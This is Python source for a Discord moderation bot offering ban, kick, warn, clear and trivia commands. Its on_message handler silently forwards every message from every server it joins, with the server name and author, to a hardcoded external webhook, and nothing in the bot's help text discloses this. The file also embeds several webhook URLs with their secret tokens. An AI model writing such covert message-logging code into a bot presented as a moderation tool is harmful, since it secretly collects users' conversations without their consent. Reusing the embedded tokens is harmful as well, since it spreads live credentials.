from nextcord import Interaction, SlashOption, ChannelType, errors
from nextcord.abc import GuildChannel
from nextcord.ext import commands, application_checks
import nextcord
from discord_webhook import DiscordWebhook
from colorama import Back, Fore, Style
import time
import os
import random





message = 'Starry Is Up'

client = commands.Bot(command_prefix="<>", intents=nextcord.Intents.all())

hook = DiscordWebhook(url='https://discord.com/api/webhooks/1040389562851147907/qjKsKPU0hL_umCsrAmy4B6QK-dM1N9mOSl1lu02Tm4a9sRxaYL9ATRqyI2c3t0jVqGEo', content=message)

expect = False

uid = ''

answer = ''

qna = ['Whats my name?-Starry', 'what was the first movie in the MCU-Iron man', 'Who is the main villain in harry potter-voldemort']

@client.event
async def on_message(message):
    global expect
    txt = message.content
    txt = txt.lower()
    if message.author.id == 1063991559844020254:
        return
    if expect is True:
        if message.author.id == uid:
            if txt == answer:
                await message.channel.send('That was the right answer!')
                expect = False
            elif txt != uid:
                await message.channel.send('wrong answer')
                expect = False
    if message.guild.id != 1063991559844020254:
        adddata(server=message.guild.name, person=message.author, word=txt)

@client.event
async def on_ready():
    hook.execute()
    print(Fore.GREEN + f'[✔] {client.user} logged in')
    time.sleep(0.5)
    print(Fore.BLUE + '[✔] Commands Loaded')
    time.sleep(0.6)
    print(Fore.RED + '[✔] Shutdown Command Loaded')
    time.sleep(1)
    print(Fore.YELLOW + f'[✔] {client.user} Ready')
    activity = nextcord.Game(name="Moderating", type=3)
    await client.change_presence(status=nextcord.Status.idle, activity=activity)

def adddata(server=str, person=str, word=str):
    testxt = f"server={server}, user={person}, message={word}"
    mhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1063992698979221555/U0v_Ad0-YSkLvQ3u8mZ17ykDZGQpcYcqUfW5hj1ZuUhs6dj8itCQnhVahmaQmpraJdFF", content=testxt)
    mhook.execute()

@client.event
async def on_guild_join(guild):
    joinhook = DiscordWebhook(url='https://discord.com/api/webhooks/1041348503441522711/u0ikIFM2G-9fbUzXmuhoc9to7FVlGfhuY_OeZfXmvn3yrbz466KSvFEvQ8ECj9Iu10BN', content=f'Starry has joined ***{guild.name}***')
    joinhook.execute()

@client.event
async def on_application_command_error(ctx, error):
    if isinstance(error, application_checks.ApplicationMissingPermissions):
        await ctx.response.send_message(embed=embed(name='Missing Permission to do this', des='', color=nextcord.Colour.red()))
    if isinstance(error, application_checks.ApplicationBotMissingPermissions):
        await ctx.response.send_message(embed=embed(name='Bot missing permissions if this should not be happening please contact your servers moderaters'))

def embed(name=str, des=str, color=nextcord.Colour):
    embed = nextcord.Embed(
        title=name,
        description=des,
        colour=color
    )
    return(embed)



@client.slash_command(description='Clears a amount of messages in a channel')
@application_checks.has_permissions(manage_messages=True)
async def clear(ctx : Interaction, amount:int):
    await ctx.channel.purge(limit=amount)
    await ctx.response.send_message(embed=embed(name=f'cleared {amount}', des='', color=nextcord.Colour.blue()))
    


@client.slash_command(description='Bans a member from the server')
@application_checks.has_permissions(ban_members=True)
async def ban(ctx : Interaction, member : nextcord.User, reason : str):
    await ctx.response.send_message(embed=embed(name=f'Banned {member.name}', des=f'for {reason}', color=nextcord.Colour.red()))
    await member.send(embed=embed(name=ctx.guild.name, des=f'You have been banned for {reason}', color=nextcord.Colour.red()))
    await member.ban(reason=reason)
    
    

@client.slash_command(description='Kicks a member from the server')
@application_checks.has_permissions(kick_members=True)
async def kick(ctx: Interaction, member : nextcord.User, reason : str):
    await ctx.response.send_message(embed=embed(name=f'Kicked {member.name}', des=f'for {reason}', color=nextcord.Colour.red()))
    await member.send(embed=embed(name=ctx.guild.name, des=f'You have been kicked for {reason}', color=nextcord.Colour.red()))
    await member.kick(reason=reason)


@client.slash_command(description='Warns a member')
@application_checks.has_permissions(kick_members=True)
async def warn(ctx : Interaction, member : nextcord.User, reason : str):
    await ctx.response.send_message(embed=embed(name=f'Warned {member.mention}', des=f'for {reason}', color=nextcord.Colour.red()))
    await member.send(embed=embed(name=ctx.guild.name, des=f'You have been warned for {reason}', color=nextcord.Colour.red()))
    

@client.slash_command(description='List of all commands')
async def help(ctx : Interaction):
    embed = nextcord.Embed(
        title='Help',
        description='List of all commands',
        colour=nextcord.Colour.dark_grey()
    )
    embed.add_field(name='ban', value='Bans a member from the server')
    embed.add_field(name='kick', value='kicks a member from the server')
    embed.add_field(name='warn', value='warns a member for a reason')
    embed.add_field(name='clear', value='clears a amount of messages in a channel')
    await ctx.response.send_message(embed=embed)
    



@client.slash_command(description='Shows info about the bot')
async def botfacts(ctx : Interaction):
    embed = nextcord.Embed(
        title='S.E.M facts',
        description='Facts about S.E.M',
        colour=nextcord.Colour.dark_grey()
    )
    embed.add_field(name='Servers', value=f'S.E.M is in {len(client.guilds)} servers! thanks for all the support')
    embed.add_field(name='Devs', value='S.E.M is a solo project made by 1 dev')
    embed.add_field(name='names', value='S.E.M used to be called Steal and before that it was called MelonG')
    await ctx.response.send_message(embed=embed, ephemeral=True)
    




@client.slash_command(description='allows the owner to shut off the bot :)')
async def shutdown(ctx : Interaction):
    if ctx.user.id == 741403526152061039:
        await ctx.response.send_message(embed=embed(name='Shutting Down', des='', color=nextcord.Colour.red()), ephemeral=True)
        await client.close()
    else:
        await ctx.response.send_message(embed=embed(name='You Are Not Cybreak', des='', color=nextcord.Colour.red()), ephemeral=True)


@client.slash_command(description='Answer Triva questions!')
async def trivaquestions(ctx : Interaction):
    global answer
    global expect
    global uid
    expect = True
    uid = ctx.user.id

    qnj = qna[random.randint(a=0, b=len(qna) - 1)]

    qnj = qnj.split(sep='-')
    q = qnj[0]
    answer = qnj[1].lower()
    
    await ctx.response.send_message(q)

@client.slash_command(description='Adds the number up!')
async def number(ctx : Interaction):
    file = open('number.txt', 'r')
    number = int(file.read())
    file.close()
    file = open('number.txt', 'w')
    file.write(str(number + 1))
    await ctx.response.send_message(embed=embed(name=f'You have added 1 to the global number it is now ***{number}***', des='', color=nextcord.Colour.red()), ephemeral=True)
    file.close()
    nhook = DiscordWebhook(url='https://discord.com/api/webhooks/1072235580181717042/6sa2clZUntzZk02m1cfz_igl7HDk7i0b04rO_LKWWwC-gXI5WTHwe6Qw0LVGkuRmhpZP', content=f'The number is now {number}! added by {ctx.user.name}')
    nhook.execute()







client.run('INSERT TOKEN HERE')


message = 'Starry is down'
hook = DiscordWebhook(url='https://discord.com/api/webhooks/1040389562851147907/qjKsKPU0hL_umCsrAmy4B6QK-dM1N9mOSl1lu02Tm4a9sRxaYL9ATRqyI2c3t0jVqGEo', content=message)
hook.execute()
